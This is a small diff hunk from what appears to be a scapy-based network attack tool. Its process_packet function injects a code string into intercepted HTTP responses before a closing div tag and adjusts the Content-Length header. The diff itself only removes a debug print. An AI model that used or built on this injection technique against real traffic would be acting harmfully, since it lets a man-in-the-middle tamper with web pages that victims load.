@@ -36,7 +36,6 @@ def process_packet(packet):
                 modified_load = scapy_packet[scapy.Raw].load.replace("</div>", injection_code + "</div>")
 
                 length_search = re.search("(?:Content-Length:\s)(\d*)", modified_load)
-                print("modified", scapy_packet.show(), modified_load)
                 length = length_search.group(1)
 
                 new_length = int(length) + len(injection_code)
